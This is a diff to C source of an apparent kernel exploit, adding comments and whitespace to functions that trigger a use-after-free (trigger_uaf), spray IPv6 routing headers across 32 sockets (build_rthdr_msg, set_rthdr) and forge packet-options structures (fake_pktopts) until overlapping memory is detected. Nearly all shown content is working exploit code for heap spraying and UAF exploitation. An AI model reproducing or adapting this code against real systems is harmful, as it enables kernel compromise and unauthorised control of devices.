@@ -164,7 +164,9 @@ void trigger_uaf(struct opaque *o) {
         for (int i = 0; i < 32; i++)
             if (free_pktopts(o->spray_sock[i]))
                 *(volatile int *)0;
-        nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // 100 us
+        
+        // Suspend process execution (100 us)
+        nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL);
     }
 
     printf_("uaf: %d\n", get_tclass(o->master_sock) - TCLASS_SPRAY);
@@ -173,10 +175,11 @@ void trigger_uaf(struct opaque *o) {
     while (!o->done1 || !o->done2);
 }
 
-// TODO: Add comment to this function
+// (Unsure) Function builds a routing header message in the provided buffer
 int build_rthdr_msg(char *buf, int size) {
     int len = ((size / 8) - 1) & ~1;
     size = (len + 1) * 8;
+    
     // Create a new Routing Header structure instance in the given buffer.
     struct ip6_rthdr *rthdr = (struct ip6_rthdr *)buf;
     rthdr->ip6r_nxt = 0;   // Set the next header value to 0 (no additional headers follow).
@@ -186,6 +189,7 @@ int build_rthdr_msg(char *buf, int size) {
     rthdr->ip6r_type = IPV6_RTHDR_TYPE_0;
     // Calculate and set the number of segments left in the routing header.
     rthdr->ip6r_segleft = rthdr->ip6r_len / 2;
+    
     return size;
 }
 
@@ -199,6 +203,8 @@ int fake_pktopts(struct opaque *o, int overlap_sock, int tclass0, unsigned long 
     char buf[0x100] = { 0 };
     int l = build_rthdr_msg(buf, 0x100);
     int tclass;
+
+    // TODO: Comment this part
     for (;;) {
         for (int i = 0; i < 32; i++) {
             *(unsigned long long *)(buf + PKTOPTS_PKTINFO_OFFSET) = pktinfo;
@@ -206,13 +212,17 @@ int fake_pktopts(struct opaque *o, int overlap_sock, int tclass0, unsigned long 
             if (set_rthdr(o->spray_sock[i], buf, l))
                 *(volatile int *)0;
         }
+        
         tclass = get_tclass(o->master_sock);
         if ((tclass & 0xffff0000) == tclass0)
             break;
-        for (int i = 0; i < 32; i++)
+        
+        for (int i = 0; i < 32; i++){
             if (set_rthdr(o->spray_sock[i], NULL, 0))
                 *(volatile int *)0;
+        }
     }
+    
     return tclass & 0xffff;
 }
 
